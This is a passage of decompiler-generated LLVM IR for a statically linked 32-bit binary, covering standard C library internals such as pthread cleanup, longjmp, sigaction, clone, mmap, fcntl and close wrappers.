  ret i32 %v1_8059846

; uselistorder directives
  uselistorder i32 (i32)* @pthread_cond_broadcast, { 1, 0 }
  uselistorder i32* @global_var_807a654.714, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_807a654.714 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_807a63c.713 to i32), { 0, 1, 3, 4, 5, 2, 6, 7, 8, 9 }
}

define i32 @pthread_cleanup_upto(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-480 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805984d = load i32, i32* @edi, align 4
  %v0_805984f = load i32, i32* @ebx, align 4
  store i32 %v0_805984f, i32* %stack_var_-16, align 4
  %v4_805984f = ptrtoint i32* %stack_var_-16 to i32
  %v0_8059853 = load i32, i32* @eax, align 4
  store i32 %v0_8059853, i32* %edi.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80738c0 to i32), i32* %esi.global-to-local, align 4
  %v1_805985e = load i32, i32* @global_var_807a620.650, align 32
  %v7_805985e = icmp ult i32 %v4_805984f, %v1_805985e
  %v1_8059864 = icmp eq i1 %v7_805985e, false
  br i1 %v1_8059864, label %dec_label_pc_805989c, label %dec_label_pc_8059866

dec_label_pc_8059866:                             ; preds = %entry
  %v1_8059866 = load i32, i32* @global_var_807a624.651, align 4
  %v7_8059866 = icmp ult i32 %v4_805984f, %v1_8059866
  br i1 %v7_8059866, label %dec_label_pc_805987b, label %dec_label_pc_805986e

dec_label_pc_805986e:                             ; preds = %dec_label_pc_8059866
  store i32 ptrtoint (i32* @global_var_8073aa0.652 to i32), i32* %esi.global-to-local, align 4
  %v1_8059873 = load i32, i32* @global_var_807a628.653, align 8
  %v7_8059873 = icmp ult i32 %v4_805984f, %v1_8059873
  br i1 %v7_8059873, label %dec_label_pc_805989c, label %dec_label_pc_805987b

dec_label_pc_805987b:                             ; preds = %dec_label_pc_805986e, %dec_label_pc_8059866
  %v0_805987b = load i32, i32* @global_var_807e100.654, align 256
  %v1_805987b = icmp eq i32 %v0_805987b, 0
  br i1 %v1_805987b, label %dec_label_pc_8059891, label %dec_label_pc_8059884

dec_label_pc_8059884:                             ; preds = %dec_label_pc_805987b
  %v0_8059884 = call i32 @__pthread_find_self()
  store i32 %v0_8059884, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805989c

dec_label_pc_805988d:                             ; preds = %dec_label_pc_80598a5
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80598c0

dec_label_pc_8059891:                             ; preds = %dec_label_pc_805987b
  %v2_8059896 = ptrtoint i32* %stack_var_-480 to i32
  store i32 %v2_8059896, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805989c

dec_label_pc_805989c:                             ; preds = %dec_label_pc_805986e, %entry, %dec_label_pc_8059884, %dec_label_pc_8059891
  %v0_80598a0 = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_805986e ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v0_8059884, %dec_label_pc_8059884 ], [ %v2_8059896, %dec_label_pc_8059891 ]
  store i32 %v4_805984f, i32* %ebp.global-to-local, align 4
  %v1_80598a0 = add i32 %v0_80598a0, 60
  %v2_80598a0 = inttoptr i32 %v1_80598a0 to i32*
  %v3_80598a0 = load i32, i32* %v2_80598a0, align 4
  store i32 %v3_80598a0, i32* %ebx.global-to-local, align 4
  %v1_80598b72 = icmp eq i32 %v3_80598a0, 0
  br i1 %v1_80598b72, label %dec_label_pc_80598c0, label %dec_label_pc_80598bb.lr.ph

dec_label_pc_80598bb.lr.ph:                       ; preds = %dec_label_pc_805989c
  br label %dec_label_pc_80598bb

dec_label_pc_80598a5:                             ; preds = %dec_label_pc_80598bb
  %v1_80598a5 = load i32, i32* %ebp.global-to-local, align 4
  %tmp = icmp ugt i32 %v4_80598af, %v1_80598a5
  br i1 %tmp, label %dec_label_pc_80598a9, label %dec_label_pc_805988d

dec_label_pc_80598a9:                             ; preds = %dec_label_pc_80598a5
  %v5_80598af = inttoptr i32 %v4_80598af to i32*
  %v6_80598af = load i32, i32* %v5_80598af, align 4
  call void @__pseudo_call(i32 %v6_80598af)
  %v0_80598b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80598b1 = add i32 %v0_80598b1, 12
  %v2_80598b1 = inttoptr i32 %v1_80598b1 to i32*
  %v3_80598b1 = load i32, i32* %v2_80598b1, align 4
  store i32 %v3_80598b1, i32* %ebx.global-to-local, align 4
  %v1_80598b7 = icmp eq i32 %v3_80598b1, 0
  br i1 %v1_80598b7, label %dec_label_pc_80598c0, label %dec_label_pc_80598bb

dec_label_pc_80598bb:                             ; preds = %dec_label_pc_80598bb.lr.ph, %dec_label_pc_80598a9
  %v4_80598af = phi i32 [ %v3_80598a0, %dec_label_pc_80598bb.lr.ph ], [ %v3_80598b1, %dec_label_pc_80598a9 ]
  %v1_80598bb = load i32, i32* %edi.global-to-local, align 4
  %v2_80598bb = add i32 %v1_80598bb, 16
  %v3_80598bb = inttoptr i32 %v2_80598bb to i32*
  %v4_80598bb = load i32, i32* %v3_80598bb, align 4
  %v10_80598bb = icmp ult i32 %v4_80598af, %v4_80598bb
  br i1 %v10_80598bb, label %dec_label_pc_80598a5, label %dec_label_pc_80598c0

dec_label_pc_80598c0:                             ; preds = %dec_label_pc_80598a9, %dec_label_pc_80598bb, %dec_label_pc_805989c, %dec_label_pc_805988d
  %v0_80598c3 = phi i32 [ 0, %dec_label_pc_805988d ], [ 0, %dec_label_pc_805989c ], [ %v4_80598af, %dec_label_pc_80598bb ], [ 0, %dec_label_pc_80598a9 ]
  %v0_80598c0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80598c0 = add i32 %v0_80598c0, 84
  %v2_80598c0 = inttoptr i32 %v1_80598c0 to i32*
  %v3_80598c0 = load i32, i32* %v2_80598c0, align 4
  %v2_80598c3 = add i32 %v0_80598c0, 60
  %v3_80598c3 = inttoptr i32 %v2_80598c3 to i32*
  store i32 %v0_80598c3, i32* %v3_80598c3, align 4
  %v1_80598c6 = icmp eq i32 %v3_80598c0, 0
  br i1 %v1_80598c6, label %dec_label_pc_80598d6, label %dec_label_pc_80598ca

dec_label_pc_80598ca:                             ; preds = %dec_label_pc_80598c0
  %v1_80598ca = load i32, i32* %edi.global-to-local, align 4
  %v2_80598ca = add i32 %v1_80598ca, 16
  %v3_80598ca = inttoptr i32 %v2_80598ca to i32*
  %v4_80598ca = load i32, i32* %v3_80598ca, align 4
  %v10_80598ca = icmp ult i32 %v3_80598c0, %v4_80598ca
  %v1_80598cd = icmp eq i1 %v10_80598ca, false
  br i1 %v1_80598cd, label %dec_label_pc_80598d6, label %dec_label_pc_80598cf

dec_label_pc_80598cf:                             ; preds = %dec_label_pc_80598ca
  %v0_80598cf = load i32, i32* %esi.global-to-local, align 4
  %v1_80598cf = add i32 %v0_80598cf, 84
  %v2_80598cf = inttoptr i32 %v1_80598cf to i32*
  store i32 0, i32* %v2_80598cf, align 4
  br label %dec_label_pc_80598d6

dec_label_pc_80598d6:                             ; preds = %dec_label_pc_80598ca, %dec_label_pc_80598c0, %dec_label_pc_80598cf
  %v2_80598da = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80598da, i32* %esi.global-to-local, align 4
  store i32 %v0_805984d, i32* %ebp.global-to-local, align 4
  ret i32 %v3_80598c0

; uselistorder directives
  uselistorder i32 %v3_80598c0, { 2, 1, 0 }
  uselistorder i32 %v4_80598af, { 1, 3, 0, 2 }
  uselistorder i32 %v3_80598b1, { 1, 0, 2 }
  uselistorder i32 %v4_805984f, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 5, 1, 2, 3, 6 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32 ()* @__pthread_find_self, { 0, 3, 8, 4, 7, 2, 6, 10, 9, 5, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8073aa0.652 to i32), { 0, 11, 1, 2, 3, 12, 13, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_80738c0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80738c0 to i32), { 0, 10, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_80598d6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80598c0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80598bb, { 1, 0 }
  uselistorder label %dec_label_pc_805989c, { 3, 2, 0, 1 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80598de = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_80598e8 = call i32 @pthread_cleanup_upto(i32 %v0_80598de)
  %v0_80598f3 = load i32, i32* @ebx, align 4
  %v4_80598f4 = call i32 @_longjmp(i32 %v0_80598f3, i32 %arg2, i32 %v1_80598e8, i32 %v1_80598e8)
  ret i32 %v4_80598f4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @siglongjmp(%sigcontext* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80598f9 = load i32, i32* @ebx, align 4
  %v4_80598fd = ptrtoint %sigcontext* %arg1 to i32
  store i32 %v4_80598fd, i32* @ebx, align 4
  store i32 %v4_80598fd, i32* @eax, align 4
  %v1_8059903 = call i32 @pthread_cleanup_upto(i32 %v0_80598f9)
  %v0_8059908 = load i32, i32* @edx, align 4
  %v5_805990f = call i32 @_longjmp(i32 %v4_80598fd, i32 %arg2, i32 %v0_8059908, i32 %v0_8059908)
  %v3_8059919 = call i32 @sigreturn(%sigcontext* %arg1)
  %v3_8059921 = call i32 @sigreturn(%sigcontext* %arg1)
  ret i32 %v3_8059921

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 (i32)* @pthread_cleanup_upto, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8059923 = load i32, i32* @esi, align 4
  %v0_8059924 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8059939 = icmp eq i32* %arg2, null
  br i1 %v1_8059939, label %dec_label_pc_805998c, label %dec_label_pc_805993d

dec_label_pc_805993d:                             ; preds = %entry
  %v2_805993d = load i32, i32* %arg2, align 4
  store i32 %v2_805993d, i32* %stack_var_-148, align 4
  %v1_8059946 = add i32 %tmp11, 4
  %v3_8059958 = bitcast i32* %stack_var_-136 to i16*
  %v4_8059958 = call i32 @memcpy(i16* %v3_8059958, i32 %v1_8059946, i32 128)
  %v1_805995d = add i32 %tmp11, 132
  %v2_8059977 = inttoptr i32 %v1_805995d to i8*
  %v3_8059977 = load i8, i8* %v2_8059977, align 1
  %v4_8059977 = and i8 %v3_8059977, 4
  %v5_8059977 = icmp eq i8 %v4_8059977, 0
  %v1_805997e = icmp eq i1 %v5_8059977, false
  br i1 %v1_805997e, label %dec_label_pc_805998c, label %dec_label_pc_8059980

dec_label_pc_8059980:                             ; preds = %dec_label_pc_805993d
  br label %dec_label_pc_805998c

dec_label_pc_805998c:                             ; preds = %dec_label_pc_8059980, %dec_label_pc_805993d, %entry
  %v1_805998e = icmp eq i32 %arg3, 0
  br i1 %v1_805998e, label %dec_label_pc_8059996, label %dec_label_pc_8059992

dec_label_pc_8059992:                             ; preds = %dec_label_pc_805998c
  %v2_8059992 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8059996

dec_label_pc_8059996:                             ; preds = %dec_label_pc_805998c, %dec_label_pc_8059992
  %v0_80599a5 = phi i32 [ 0, %dec_label_pc_805998c ], [ %v2_8059992, %dec_label_pc_8059992 ]
  br i1 %v1_8059939, label %dec_label_pc_80599a3, label %dec_label_pc_805999c

dec_label_pc_805999c:                             ; preds = %dec_label_pc_8059996
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_80599a3

dec_label_pc_80599a3:                             ; preds = %dec_label_pc_8059996, %dec_label_pc_805999c
  %v0_80599a6 = phi %sigaction* [ null, %dec_label_pc_8059996 ], [ %phitmp, %dec_label_pc_805999c ]
  %v5_80599ae = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_80599a6, i32 %v0_80599a5, i32 8)
  store i32 %v5_80599ae, i32* %ebx.global-to-local, align 4
  br i1 %v1_805998e, label %dec_label_pc_80599f1, label %dec_label_pc_80599bc

dec_label_pc_80599bc:                             ; preds = %dec_label_pc_80599a3
  %v2_80599bc = icmp slt i32 %v5_80599ae, 0
  br i1 %v2_80599bc, label %dec_label_pc_80599f1, label %dec_label_pc_80599c0

dec_label_pc_80599c0:                             ; preds = %dec_label_pc_80599bc
  %v3_80599c0 = load i32, i32* %stack_var_-288, align 4
  %v2_80599c4 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80599c0, i32* %v2_80599c4, align 4
  %v2_80599cc = ptrtoint i32* %stack_var_-276 to i32
  %v1_80599d1 = add i32 %arg3, 4
  %v3_80599d5 = inttoptr i32 %v1_80599d1 to i16*
  %v4_80599d5 = call i32 @memcpy(i16* %v3_80599d5, i32 %v2_80599cc, i32 128)
  %v2_80599de = add i32 %arg3, 132
  %v3_80599de = inttoptr i32 %v2_80599de to i32*
  %v2_80599eb = add i32 %arg3, 136
  %v3_80599eb = inttoptr i32 %v2_80599eb to i32*
  %v0_80599f1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80599f1

dec_label_pc_80599f1:                             ; preds = %dec_label_pc_80599bc, %dec_label_pc_80599a3, %dec_label_pc_80599c0
  %v0_80599f1 = phi i32 [ %v5_80599ae, %dec_label_pc_80599bc ], [ %v5_80599ae, %dec_label_pc_80599a3 ], [ %v0_80599f1.pre, %dec_label_pc_80599c0 ]
  store i32 %v0_8059924, i32* @ebx, align 4
  store i32 %v0_8059923, i32* @esi, align 4
  ret i32 %v0_80599f1

; uselistorder directives
  uselistorder i32 %v5_80599ae, { 0, 1, 3, 2 }
  uselistorder i1 %v1_805998e, { 1, 0 }
  uselistorder i1 %v1_8059939, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_80599f1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80599a3, { 1, 0 }
  uselistorder label %dec_label_pc_8059996, { 1, 0 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 -22, i32* @eax, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8059a05 = icmp eq i32 %arg1, 0
  br i1 %v1_8059a05, label %dec_label_pc_8059a63, label %dec_label_pc_8059a09

dec_label_pc_8059a09:                             ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v1_8059a0d = icmp eq i32 %arg2, 0
  br i1 %v1_8059a0d, label %dec_label_pc_8059a63, label %dec_label_pc_8059a11

dec_label_pc_8059a11:                             ; preds = %dec_label_pc_8059a09
  %v1_8059a11 = and i32 %arg2, -16
  %v1_8059a14 = add i32 %v1_8059a11, -28
  store i32 %v1_8059a14, i32* %ecx.global-to-local, align 4
  %v2_8059a1b = add i32 %v1_8059a11, -16
  %v3_8059a1b = inttoptr i32 %v2_8059a1b to i32*
  store i32 %arg4, i32* %v3_8059a1b, align 16
  %v1_8059a22 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8059a22 = add i32 %v1_8059a22, 8
  %v3_8059a22 = inttoptr i32 %v2_8059a22 to i32*
  store i32 %arg1, i32* %v3_8059a22, align 4
  %v0_8059a25 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8059a25 = add i32 %v0_8059a25, 4
  %v2_8059a25 = inttoptr i32 %v1_8059a25 to i32*
  store i32 0, i32* %v2_8059a25, align 4
  %v0_8059a2c = load i32, i32* %ecx.global-to-local, align 4
  %v1_8059a2c = inttoptr i32 %v0_8059a2c to i32*
  store i32 0, i32* %v1_8059a2c, align 4
  %v0_8059a32 = load i32, i32* @ebx, align 4
  store i32 %v0_8059a32, i32* %stack_var_-4, align 4
  %v0_8059a33 = load i32, i32* @esi, align 4
  %v0_8059a34 = load i32, i32* @edi, align 4
  store i32 %v0_8059a34, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_8059a4a = load i32, i32* %stack_var_0, align 4
  %v4_8059a4a = call i32 @clone(i32 %v0_8059a34, i32 %v0_8059a33, i32 %v0_8059a32, i32 %v3_8059a4a)
  store i32 %v4_8059a4a, i32* @eax, align 4
  %v2_8059a4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059a4c, i32* @edi, align 4
  store i32 %v0_8059a33, i32* @esi, align 4
  %v2_8059a4e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059a4e, i32* @ebx, align 4
  %v2_8059a4f = icmp slt i32 %v4_8059a4a, 0
  %v2_8059a51 = icmp eq i1 %v2_8059a4f, false
  br i1 %v2_8059a51, label %dec_label_pc_8059a53, label %dec_label_pc_8059a63

dec_label_pc_8059a53:                             ; preds = %dec_label_pc_8059a11
  %v1_8059a4f = icmp eq i32 %v4_8059a4a, 0
  br i1 %v1_8059a4f, label %dec_label_pc_8059a56, label %dec_label_pc_8059a55

dec_label_pc_8059a55:                             ; preds = %dec_label_pc_8059a53
  ret i32 %v4_8059a4a

dec_label_pc_8059a56:                             ; preds = %dec_label_pc_8059a53
  store i32 %v0_8059a33, i32* @ebp, align 4
  store i32 134584922, i32* %stack_var_-4, align 4
  call void @__pseudo_call(i32 %v2_8059a4e)
  store i32 0, i32* @ebx, align 4
  call void @exit(i32 0)
  unreachable

dec_label_pc_8059a63:                             ; preds = %dec_label_pc_8059a11, %dec_label_pc_8059a09, %entry
  %v0_8059a63 = call i32 @__syscall_error()
  ret i32 %v0_8059a63

; uselistorder directives
  uselistorder i32 %v4_8059a4a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8059a33, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__sigsetjmp(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* %stack_var_4, align 4
  store i32 %tmp2, i32* %eax.global-to-local, align 4
  %v0_8059a6c = load i32, i32* @ebx, align 4
  store i32 %v0_8059a6c, i32* %arg2, align 4
  %v0_8059a6e = load i32, i32* @esi, align 4
  %v2_8059a6e = add i32 %tmp2, 4
  %v3_8059a6e = inttoptr i32 %v2_8059a6e to i32*
  store i32 %v0_8059a6e, i32* %v3_8059a6e, align 4
  %v0_8059a71 = load i32, i32* @edi, align 4
  %v1_8059a71 = load i32, i32* %eax.global-to-local, align 4
  %v2_8059a71 = add i32 %v1_8059a71, 8
  %v3_8059a71 = inttoptr i32 %v2_8059a71 to i32*
  store i32 %v0_8059a71, i32* %v3_8059a71, align 4
  %v2_8059a74 = ptrtoint i32* %stack_var_4 to i32
  %v1_8059a78 = load i32, i32* %eax.global-to-local, align 4
  %v2_8059a78 = add i32 %v1_8059a78, 16
  %v3_8059a78 = inttoptr i32 %v2_8059a78 to i32*
  store i32 %v2_8059a74, i32* %v3_8059a78, align 4
  %v1_8059a7e = load i32, i32* %eax.global-to-local, align 4
  %v2_8059a7e = add i32 %v1_8059a7e, 20
  %v3_8059a7e = inttoptr i32 %v2_8059a7e to i32*
  store i32 %arg1, i32* %v3_8059a7e, align 4
  %v0_8059a81 = load i32, i32* @ebp, align 4
  %v1_8059a81 = load i32, i32* %eax.global-to-local, align 4
  %v2_8059a81 = add i32 %v1_8059a81, 12
  %v3_8059a81 = inttoptr i32 %v2_8059a81 to i32*
  store i32 %v0_8059a81, i32* %v3_8059a81, align 4
  %v0_8059a84 = call i32 @__sigjmp_save()
  store i32 %v0_8059a84, i32* %eax.global-to-local, align 4
  ret i32 %v0_8059a84

; uselistorder directives
  uselistorder i32* %stack_var_4, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8059a8c = load i32, i32* @ebx, align 4
  %v2_8059a93 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8059a93, i32* @ebx, align 4
  %v8_8059a97 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8059a8c, i32* @ebx, align 4
  %v3_8059aa0 = icmp ugt i32 %v8_8059a97, -4096
  call void @__pseudo_cond_branch(i1 %v3_8059aa0, i32 134615292)
  ret i32 %v8_8059a97

; uselistorder directives
  uselistorder i32 %v8_8059a97, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8059aa8 = load i32, i32* @edi, align 4
  %v0_8059aa9 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8059abd = add i32 %arg2, -12
  %v6_8059ac7 = icmp ugt i32 %v1_8059abd, 2
  br i1 %v6_8059ac7, label %dec_label_pc_8059ad7, label %dec_label_pc_8059ac9

dec_label_pc_8059ac9:                             ; preds = %entry
  %v4_8059acd = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8059abd)
  br label %dec_label_pc_8059af9

dec_label_pc_8059ad7:                             ; preds = %entry
  store i32 %arg1, i32* @ebx, align 4
  %v1_8059adf = call i32 @fcntl(i32 %v0_8059aa9)
  store i32 %v1_8059adf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059adf, -4095
  br i1 %tmp, label %dec_label_pc_8059af7, label %dec_label_pc_8059aeb

dec_label_pc_8059aeb:                             ; preds = %dec_label_pc_8059ad7
  %v1_8059aeb = call i32 @__errno_location(i32 %v0_8059aa9)
  %v0_8059af0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059af0 = sub i32 0, %v0_8059af0
  %v2_8059af2 = inttoptr i32 %v1_8059aeb to i32*
  store i32 %v1_8059af0, i32* %v2_8059af2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8059af7

dec_label_pc_8059af7:                             ; preds = %dec_label_pc_8059ad7, %dec_label_pc_8059aeb
  %v0_8059af7 = phi i32 [ %v1_8059adf, %dec_label_pc_8059ad7 ], [ -1, %dec_label_pc_8059aeb ]
  br label %dec_label_pc_8059af9

dec_label_pc_8059af9:                             ; preds = %dec_label_pc_8059ac9, %dec_label_pc_8059af7
  %v0_8059afe = phi i32 [ %v4_8059acd, %dec_label_pc_8059ac9 ], [ %v0_8059af7, %dec_label_pc_8059af7 ]
  store i32 %v0_8059aa9, i32* @ebx, align 4
  store i32 %v0_8059aa8, i32* @edi, align 4
  ret i32 %v0_8059afe

; uselistorder directives
  uselistorder i32 %v1_8059adf, { 1, 0, 2 }
  uselistorder i32 %v0_8059aa9, { 1, 0, 2 }
  uselistorder i32 (i32)* @fcntl, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8059af9, { 1, 0 }
  uselistorder label %dec_label_pc_8059af7, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059b00 = load i32, i32* @edi, align 4
  store i32 %v0_8059b00, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_8059b18 = load i32, i32* @ebx, align 4
  %v1_8059b20 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8059b20, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059b20, -4095
  br i1 %tmp, label %dec_label_pc_8059b38, label %dec_label_pc_8059b2c

dec_label_pc_8059b2c:                             ; preds = %entry
  %v1_8059b2c = call i32 @__errno_location(i32 %v0_8059b18)
  %v0_8059b31 = load i32, i32* %edi.global-to-local, align 4
  %v1_8059b31 = sub i32 0, %v0_8059b31
  %v2_8059b33 = inttoptr i32 %v1_8059b2c to i32*
  store i32 %v1_8059b31, i32* %v2_8059b33, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8059b38

dec_label_pc_8059b38:                             ; preds = %entry, %dec_label_pc_8059b2c
  %v0_8059b38 = phi i32 [ %v1_8059b20, %entry ], [ -1, %dec_label_pc_8059b2c ]
  %v2_8059b3d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059b3d, i32* %edi.global-to-local, align 4
  ret i32 %v0_8059b38

; uselistorder directives
  uselistorder i32 %v1_8059b20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059b38, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8059b41 = load i32, i32* @esi, align 4
  store i32 %v0_8059b41, i32* %stack_var_-8, align 4
  %v4_8059b49 = ptrtoint %sigaction* %arg2 to i32
  store i32 %v4_8059b49, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8059b55 = load i32, i32* @ebx, align 4
  %v7_8059b5d = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8059b5d, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_8059b5d, -4095
  br i1 %tmp, label %dec_label_pc_8059b75, label %dec_label_pc_8059b69

dec_label_pc_8059b69:                             ; preds = %entry
  %v1_8059b69 = call i32 @__errno_location(i32 %v0_8059b55)
  %v0_8059b6e = load i32, i32* %esi.global-to-local, align 4
  %v1_8059b6e = sub i32 0, %v0_8059b6e
  %v2_8059b70 = inttoptr i32 %v1_8059b69 to i32*
  store i32 %v1_8059b6e, i32* %v2_8059b70, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059b75

dec_label_pc_8059b75:                             ; preds = %entry, %dec_label_pc_8059b69
  %v0_8059b75 = phi i32 [ %v7_8059b5d, %entry ], [ -1, %dec_label_pc_8059b69 ]
  %v2_8059b78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8059b78, i32* @esi, align 4
  ret i32 %v0_8059b75

; uselistorder directives
  uselistorder i32 %v7_8059b5d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059b75, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059ba4 = load i32, i32* @edi, align 4
  store i32 %v0_8059ba4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8059bac = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8059bb4 = call i32 @close(i32 %v0_8059bac)
  store i32 %v0_8059bac, i32* @ebx, align 4
  store i32 %v1_8059bb4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8059bb4, -4095
  br i1 %tmp, label %dec_label_pc_8059bcc, label %dec_label_pc_8059bc0

dec_label_pc_8059bc0:                             ; preds = %entry
  %v1_8059bc0 = call i32 @__errno_location(i32 %v0_8059bac)
  %v0_8059bc5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8059bc5 = sub i32 0, %v0_8059bc5
  %v2_8059bc7 = inttoptr i32 %v1_8059bc0 to i32*
  store i32 %v1_8059bc5, i32* %v2_8059bc7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8059bcc

